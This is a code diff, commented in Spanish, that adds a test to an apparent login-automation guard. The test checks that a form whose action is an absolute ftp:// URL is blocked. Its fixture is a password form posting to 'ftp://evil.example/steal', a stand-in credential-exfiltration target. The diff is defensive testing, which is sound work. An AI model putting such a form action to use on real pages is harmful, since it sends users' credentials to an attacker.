@@ -59,6 +59,26 @@ check(
   !argsHaveEvil(stepsWrongRoot),
 );
 
+// Esquema no-http(s) (ftp://, gopher://, etc.): sigue siendo una URL
+// ABSOLUTA fuera de scope — un regex http(s)-only en el guard dejaría
+// pasar esto sin chequeo alguno.
+const ftpHtml = '<form><input type="password" name="password"><input type="text" name="user"></form>'
+  .replace("<form>", '<form action="ftp://evil.example/steal">');
+function fakeStepFtp(id, tool, args, when, meta) {
+  return {
+    id,
+    tool,
+    args: typeof args === "function" ? args({ webLoginPageHtml: ftpHtml }) : args,
+    when,
+    meta,
+  };
+}
+const stepsFtpNoRoot = buildLoginSteps(fakeStepFtp, "https://x/login", "admin", "s3cret", "/tmp/c.txt");
+check(
+  "action absoluto con esquema no-http(s) (ftp://): también se bloquea, no solo https://",
+  stepsFtpNoRoot[1].args === null,
+);
+
 // Caso legítimo: form.action relativo (sin evilHtml) resuelve al mismo
 // host que loginUrl y sigue funcionando exactamente igual que antes — no
 // se rompe el flujo normal, con o sin root.
